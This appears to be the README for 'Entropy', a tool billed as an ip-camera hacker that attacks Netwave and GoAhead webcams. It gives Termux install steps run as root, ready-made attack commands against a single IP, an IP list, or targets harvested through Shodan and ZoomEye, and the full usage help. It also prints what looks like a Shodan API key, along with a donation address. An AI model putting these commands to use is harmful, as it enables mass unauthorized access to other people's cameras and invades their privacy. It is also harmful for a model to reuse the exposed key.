# Entropy
Hi, this is a ip-camera hacker<br>
# Donate
<b>Who does not mind a penny on the development of the project:</b><br>
<b>Bitcoin: 1LBjGEQ16jK23cVqtkFg5fm91poKVVAP5b<br>
<br>
There will be questions - Telegram: <a href="https://t.me/Mrxanon"> @Mrxanon</a><br>
# How to install?
<b>Follow the instructions...</b><br>
<b>If you have Android - download <a href="https://play.google.com/store/apps/details?id=com.termux&hl=ru">Termux from Google Play</a> and open it and write the commands below:<br>
• <code>apt update</code><br>
• <code>apt upgrade -y</code><br>
• <code>apt install python -y</code><br>
• <code>apt install git -y</code><br>
• <code>apt install tsu -y</code><br> 
• <code>git clone https://github.com/Mr-X-01/entropy</code><br>
• <code>cd entropy</code><br>
• <code>chmod +x install.sh</code><br>
• <code>tsu</code><br> 
• <code>./install.sh</code><br>
• <code>pip3 install -r requirements.txt</code><br>

# How to start?
<b>Example of attacking a single webcam</b><br>
• <code>entropy -b 1 -i 192.168.1.100:80 -v</code><br>
<b>Example of attacking webcams from a file</b><br>
• <code>entropy -b 2 -l iplist.txt -v</code><br>
<b>Example of attacking webcams through Shodan</b><br>
• <code>entropy -b 2 -v --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD</code><br>

# How to uninstall?
• <code>cd entropy</code><br>
• <code>chmod +x uninstall.sh</code><br>
• <code>./uninstall.sh</code><br>

# Entropy Toolkit execution
<b>To run Entropy Toolkit you should </b><br>
<b>execute the following command.</b><br>
• <code>entropy</code><br>
```
usage: entropy [-h] [-b [1|2]] [-o <output_path>] [--timeout <timeout>]
               [-t <tasks>] [-c <count>] [-q | -v]
               [-a <ip:port> | -i <input_file> | --shodan <api> | --zoomeye <api>]
               [-u] [--version]

optional arguments:
  -h, --help            show this help message and exit
  -b [1|2], --brand [1|2]
                        Choose the brand of IP webcam. (1)Netwave, (2)GoAhead.
  -o <output_path>, --output <output_path>
                        Output to the specified path.
  --timeout <timeout>   Timeout in seconds.
  -t <tasks>, --task <tasks>
                        Run tasks number of connects in parallel.
  -c <count>, --count <count>
                        The number of IP you want to get.
  -q, --quiet           Quiet mode.
  -v, --verbose         Verbose mode.
  -a <ip:port>, --address <ip:port>
                        IP and port of the webcam.
  -i <input_file>, --input <input_file>
                        List of webcams addresses.
  --shodan <api>        Attack through Shodan.
  --zoomeye <api>       Attack through ZoomEye.
  -u, --update          Update Entropy Toolkit.
  --version             Show Entropy Toolkit version.
```
